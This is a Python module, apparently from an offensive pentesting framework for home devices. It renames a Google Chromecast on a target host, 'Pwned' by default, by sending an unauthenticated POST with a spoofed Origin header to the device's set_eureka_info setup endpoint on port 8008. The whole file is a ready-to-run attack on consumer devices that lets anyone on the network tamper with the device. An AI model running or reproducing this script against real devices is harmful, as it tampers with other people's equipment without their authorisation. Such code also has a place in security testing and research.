import requests
from modules._module import Module
from utils.custom_print import print_info, print_error
import time
from json import dumps
from utildata.dataset_options import Option

class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Rename Chromecast",
                       "Description": "Using this module you can change directly the name to a specific chromecast.",
                       "Author": "@pablogonzalezpe, @josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"rhost": Option.create(name="rhost", required=True),
                   "name": Option.create(name="name", value="Pwned", 
                            description="New name to set", required=True)}

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    def run(self):
        try:

            uri = f"http://{self.args['rhost']}:8008/setup/set_eureka_info"
            headers = {
                'Content-Type':'application/json',
                'Origin': 'https://www.google.com',
                'Host': f"{self.args['rhost']}:8008"
            }
            data = {"name": self.args["name"]}

            response = requests.post(uri, headers=headers, data=dumps(data))
            if response.status_code == 200:
                print_info("Name changed!")
            else:
                print_error(f"Error, you should check HTTP Code: {response.status_code}")
        except Exception as e:
            print(e)